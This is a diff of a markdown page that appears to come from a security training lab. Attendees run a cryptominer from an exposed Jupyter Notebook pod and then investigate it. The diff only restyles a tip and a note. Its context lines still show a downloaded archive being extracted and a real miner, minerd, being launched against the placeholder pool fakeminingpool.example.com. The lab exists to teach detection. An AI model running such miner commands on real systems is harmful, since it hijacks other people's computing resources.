@@ -8,7 +8,7 @@ For this scenario, we have set up an unguarded Jupyter Notebook pod within the c
 
 This is a standard Jupyter notebook, running the `jupyter/minimal-notebook` docker image. Select the Python 3 notebook, and run some commands in it.
 
-> **Tip:**
+> <i class="fa fa-fire"></i> **Tip:**
 > 
 > Use the play button or the keyboard shortcut Ctrl-Enter to run code within a code block in the Jupyter Notebook.
 
@@ -73,7 +73,9 @@ tar -xzf download
 ./minerd --url fakeminingpool.example.com -u ME -p passwd
 ```
 
-> Note: this is a real cryptominer, but is not configured to connect to a real service.
+> <i class="fa-solid fa-info"></i> **Note:**
+> 
+> This is a real cryptominer, but is not configured to connect to a real service.
 
 ## Investigation
 
